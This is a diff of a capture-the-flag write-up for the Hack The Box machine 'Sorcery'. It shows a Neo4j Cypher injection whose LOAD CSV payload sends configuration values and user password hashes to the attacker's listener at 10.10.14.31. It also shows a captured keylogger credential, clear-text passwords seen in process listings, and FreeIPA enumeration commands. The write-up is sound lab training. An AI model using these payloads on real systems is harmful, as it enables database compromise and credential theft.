@@ -18,7 +18,6 @@ tags:
 - "phishing"
 - "freeipa"
 ---
-
 # week5-sorcery
 
 ## Engagement Notes
@@ -367,6 +366,7 @@ Using the forged tokens, I can modify all my properites to LOOK like I'm an admi
 Hidden in backend-macros/src/lib.rs we can see of what the github issue spoke: A string with interpolated, user controlled, values. Namely the `#name` variable that is taken from any query to `get_by_xxx`. There's 2 in the repo, one for get_by_id (store items), and one for get_by_username. I did not find a way to customize the get_by_username payload as there's many filters to ensure alphanumeric values there. However in the item lookup URI there is no such limiation.
 
 Source code for the derived functions of "get_by_xxx":
+{% raw %}
 ```rust
     let get_functions = fields.iter().map(|&FieldWithAttributes { field, .. }| {
         let name = field.ident.as_ref().unwrap();
@@ -394,9 +394,11 @@ Source code for the derived functions of "get_by_xxx":
             }
         }
 ```
+{% endraw %}
 
 Example result searching for `get_by_`:
 backend/src/api/auth
+
 ```rust
 #[post("/login", data = "<data>")]
 pub async fn login<'r>(
@@ -435,9 +437,10 @@ with requests.Session() as s:
     print(login(s, "tokugero","tokugero"))
 ```
 
+```log
     b'["tokugero", "tokugero"]'
     eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjlkNTQ4ZjQyLTk3YWUtNDA3MC05MDlhLThjOTU4OThjMDgzNCIsInVzZXJuYW1lIjoidG9rdWdlcm8iLCJwcml2aWxlZ2VMZXZlbCI6MCwid2l0aFBhc3NrZXkiOmZhbHNlLCJvbmx5Rm9yUGF0aHMiOm51bGwsImV4cCI6MTc1MDQ3OTE3OX0.28vyPBNdsMQb5dIRLritMDzip8zdpHHjLVqoDX9HXqs
-
+```
 
 When encountering this suspected weakness, I had to do a bit of research to reacquaint myself with the technique.
 
@@ -445,7 +448,7 @@ When encountering this suspected weakness, I had to do a bit of research to reac
 * https://www.youtube.com/watch?v=SIqKo7xiPVA
 
 The gist of the vulnerability is as such:
-
+{% raw %}
 ```rust
 let query_string = format!( // format the following string with N number of varialbes as defined by {}
     //         more vars----v-----v
@@ -454,6 +457,7 @@ let query_string = format!( // format the following string with N number of vari
     #struct_name, #name_string, #name // The variables that will be injected in the above string
 );
 ```
+{% endraw %}
 
 The final string will look as such:  
 `MATCH (result: #struct_name {#name_string: "#name"}) RETURN result`
@@ -472,15 +476,17 @@ import requests
 
 userpayload = 'x%22}) RETURN 1 UNION CALL apoc.util.sleep(10000) RETURN 1/'
 #                              '}) OR 1=1 RETURN u/*
-# "MATCH (result: {} {{ {}: "{}" }}) RETURN result"
+# "MATCH (result: {} \{\{ \{}: "{}" }}) RETURN result"
 
 with requests.Session() as s:
     print(login(s, userpayload, "tokugero"))
-```
 
+{% raw %}
+```
     b'["x%22}) RETURN 1 UNION CALL apoc.util.sleep(10000) RETURN 1/", "tokugero"]'
     invalid username
-
+```
+{% endraw %}
 
 Ultimately the user injection didn't pan out. There wasn't a way I was able to pass the payload through the filters.
 
@@ -519,10 +525,10 @@ with requests.Session() as s:
     print(response.status_code)
 
 ```
-
+```log
     b'["tokugero", "tokugero"]'
     200
-
+```
 
 
 ```python
@@ -537,7 +543,7 @@ with requests.Session() as s:
     print(createProductResponse.headers)
     pprint(createProductResponse.text)
 ```
-
+```log
     b'["tokugero", "tokugero"]'
     eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjlkNTQ4ZjQyLTk3YWUtNDA3MC05MDlhLThjOTU4OThjMDgzNCIsInVzZXJuYW1lIjoidG9rdWdlcm8iLCJwcml2aWxlZ2VMZXZlbCI6MCwid2l0aFBhc3NrZXkiOmZhbHNlLCJvbmx5Rm9yUGF0aHMiOm51bGwsImV4cCI6MTc1MDQ4MDE3OX0.5B66-IIujFO7Wu7iBsSzErw5f4RBG_RXN-yLWXsFMH0
     200
@@ -545,7 +551,7 @@ with requests.Session() as s:
     {'Server': 'nginx/1.27.1', 'Date': 'Fri, 20 Jun 2025 04:29:40 GMT', 'Content-Type': 'text/x-component', 'Transfer-Encoding': 'chunked', 'Connection': 'keep-alive', 'Vary': 'RSC, Next-Router-State-Tree, Next-Router-Prefetch, Accept-Encoding', 'Cache-Control': 'no-cache, no-store, max-age=0, must-revalidate', 'x-action-revalidated': '[[],0,0]', 'X-Powered-By': 'Next.js', 'Content-Encoding': 'gzip'}
     ('0:["$@1",["eMXTkHuLPViqV0QpNTSCV",null]]\n'
      '1:{"error":{"error":"401 Unauthorized"}}\n')
-
+```
 
 After some trial and error, we find the following payload can phone home. And even better, if we serve a file from home, we can have it get called again for each value in my local file!
 
@@ -575,18 +581,18 @@ with requests.Session() as s:
     print(response.url)
     print(response.status_code)
 ```
-
+```log
     b'["tokugero", "tokugero"]'
     https://sorcery.htb/dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f%22%7D%29%20WITH%201%20as%20a%20MATCH%20%28f%3AConfig%29%20UNWIND%20keys%28f%29%20as%20p%20LOAD%20CSV%20FROM%20%22http%3A%2F%2F10.10.14.31%3A4444%2F%3F%22%2Bp%2B%22%3D%22%2BtoString%28f%5Bp%5D%29%20as%20l%20RETURN%200%2F%2F
     500
-
+```
 
 ```sh
 10.129.42.101 - - [16/Jun/2025 02:44:12] "GET /?registration_key=dd05d743-b560-45dc-9a09-43ab18c7a513 HTTP/1.1" 200 -
 10.129.42.101 - - [16/Jun/2025 02:44:12] "GET /?is_initialized=true HTTP/1.1" 200 -
+```
 
 And with this I can get back the users and password hashes.
-
 
 ```python
 payload = '88b6b6c5-a614-486c-9d51-d255f47efb4f"}) WITH 1 as a MATCH (f:User) UNWIND keys(f) as p LOAD CSV FROM "http://10.10.14.31:4444/?"+p+"="+toString(f[p]) as l RETURN 0//'
@@ -598,11 +604,12 @@ with requests.Session() as s:
     print(response.url)
     print(response.status_code)
 ```
-
+```log
     b'["tokugero", "tokugero"]'
     https://sorcery.htb/dashboard/store/88b6b6c5-a614-486c-9d51-d255f47efb4f%22%7D%29%20WITH%201%20as%20a%20MATCH%20%28f%3AUser%29%20UNWIND%20keys%28f%29%20as%20p%20LOAD%20CSV%20FROM%20%22http%3A%2F%2F10.10.14.31%3A4444%2F%3F%22%2Bp%2B%22%3D%22%2BtoString%28f%5Bp%5D%29%20as%20l%20RETURN%200%2F%2F
     500
-
+```
+```log
 
 10.129.89.63 - - [16/Jun/2025 21:00:09] "GET /?id=2d9f0d9e-0935-49f3-afcd-29abd3427011 HTTP/1.1" 200 -
 10.129.89.63 - - [16/Jun/2025 21:00:09] "GET /?password=$argon2id$v=19$m=19456,t=2,p=1$T+K9waOashQqEOcDljfe5Q$X5Yul0HakDZrbkEDxnfn2KYJv/BdaFsXn7xNwS1ab8E HTTP/1.1" 200 -
@@ -613,7 +620,7 @@ with requests.Session() as s:
 10.129.89.63 - - [16/Jun/2025 21:00:11] "GET /?id=59b78ed7-8ac3-4bda-87d1-52c42d8662f9 HTTP/1.1" 200 -
 10.129.89.63 - - [16/Jun/2025 21:00:11] "GET /?password=$argon2id$v=19$m=19456,t=2,p=1$VJxpFhWfKtUrRa9uREMGLg$PMqSK4BO38mG/lj0JYgkDSkgGRaBTGZ9YNBU7sPKKlM HTTP/1.1" 200 -
 10.129.89.63 - - [16/Jun/2025 21:00:11] "GET /?username=tokugero5 HTTP/1.1" 200 -
-
+```
 And finally, the easy mode access:
 
 
@@ -2061,9 +2068,9 @@ def keystroke():
 The motherlode!
 ```log
 Keystroke data received: {'user_name': 'tom_summers', 'password': 'jNsMKQ6k2.XDMPu.'}
-
+```
 And with that, we're finally in! This was BY FAR the hardest part of this box. In comparison, the rest of this could have been an easy box rating, no problem.
-
+```sh
 (.venv)  /infrastructure  ssh sorcery.htb -l tom_summers    
 (tom_summers@sorcery.htb) Password: 
 Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)
@@ -2081,7 +2088,7 @@ tom_summers@main:~$ ls
 user.txt
 tom_summers@main:~$ cat user.txt 
 af59b6c224301f0a7aae1775ff8152c2
-
+```
 ## Onwards to Root!
 
 Initial enumeration got me VERY lucky, as I had happened to do a ps EXACTLY as an admin script was resetting a user password. 
@@ -2089,7 +2096,7 @@ Initial enumeration got me VERY lucky, as I had happened to do a ps EXACTLY as a
 Later on I'll run [PsPy](https://github.com/DominicBreuker/pspy) to watch for changes in the ps list and find a few other cleanup items that happen along with ash_winter's password, however they're not as useful as this.
 
 There may have been another intended path that was longer around as there's references to a tom_summers_admin, a donna_adams sysadmin, and a rebecca_smith htaccess: but none of these I needed. I suspect that rebecca_smith's password was a randomly changing password that gave access to port 5000 accessible from the box or an ssh proxy from Tom, but I didn't go that direction because I dont' need that negativity in my life after Kafka. Next time if I'm not supposed to see clear text passwords in ps, just cat it out of a file that you dangle in front of my face instead!
-
+```log
 admin     144033  139708  2 18:53 ?        00:00:00 /usr/bin/python3 -I /usr/bin/ipa user-mod ash_winter --setattr userPassword=w@LoiU8Crmdep
 root      144103       2  0 18:53 ?        00:00:00 [kworker/3:1-rcu_par_gp]
 root      144113       2  0 18:53 ?        00:00:00 [kworker/0:2-rcu_par_gp]
@@ -2097,7 +2104,7 @@ root      144562       2  0 18:53 ?        00:00:00 [kworker/0:3-rcu_par_gp]
 root      144915    2029 50 18:53 ?        00:00:00 runc --root /var/run/docker/runtime-runc/moby-165536.165536 --log /run/containerd/io.containerd.runtime.v2.task/moby-165536.165536/e5cc63ffe2096d192a2362206a4a9
 tom_sum+  144921  142925 99 18:53 pts/0    00:00:00 ps -ef
 tom_summers@main:~$ 
-
+```
 Using pspy:
 
 ```log
@@ -2114,7 +2121,7 @@ Using pspy:
 
 
 2025/06/19 20:03:21 CMD: UID=1638400000 PID=359133 | /usr/bin/python3 -I /usr/bin/ipa user-mod ash_winter --setattr userPassword=w@LoiU8Crmdep 
-
+```
 This user had more permissions than Tom, and poor Tom isn't trusted to do anything so I'm moving on.
 
 ```sh
@@ -2149,7 +2156,7 @@ applicable law.
 -sh: 32: Thu Jun 19 18:54:54 2025: not found
 Last login: Thu Jun 19 18:54:54 2025 from 10.10.14.31
 $ 
-
+```
 Another thing we find, in the same ps output, is use of [IPA](https://www.freeipa.org/page/Documentation.html).  
 Using some [cheatsheets](https://angelica.gitbook.io/hacktricks/linux-hardening/freeipa-pentesting), we can read a bit about methods that we might need to enumerate this Temu AD.
 
@@ -2167,7 +2174,7 @@ ldapsearch -Y gssapi -b "cn=computers,cn=accounts,dc=sorcery,dc=htb"
 
 # Get hosts groups
 ldapsearch -Y gssapi -b "cn=hostgroups,cn=accounts,dc=sorcery,dc=htb"
-
+```
 However umping all of ldapsearch, we can see a whole lot of data, and crawling through it we see a few juicy targets:
 
 ```sh
@@ -2354,15 +2361,16 @@ total 524K
 drwxr-xr-x 2 2002 2002 4.0K Jun 20 03:40 .
 drwxr-xr-x 3    0    0 4.0K Apr 28 12:07 ..
 -rwxr--r-- 1 2002 2002 516K Jun 20 03:40 Xvfb_screen0
-
-# SCP this file locally
-# Necessary to crop the image to just the bytes that copilot calculated I should need based on the type (4 * 512 * 256 for rgba)
+```
+SCP this file locally
+Necessary to crop the image to just the bytes that copilot calculated I should need based on the type (4 * 512 * 256 for rgba)
+```sh
 [nix-shell:~/ctf/htb/season8/week5-sorcery/exfil]$ head -c 524288 Xvfb_screen0 > frame.raw
 
 [nix-shell:~/ctf/htb/season8/week5-sorcery/exfil]$ magick -size 512x256 -depth 8 rgba:frame.raw screenshot.png
 
 ![image.png](../../../assets/images/ctf/events/season8-htb-25/2025-06-21-week5-sorcery.md/2025-06-21-week5-sorcery/image.png)
-
+```
 ### Tom_Summers_Admin
 Sudo has the docker login option and strace, both super userful!
 
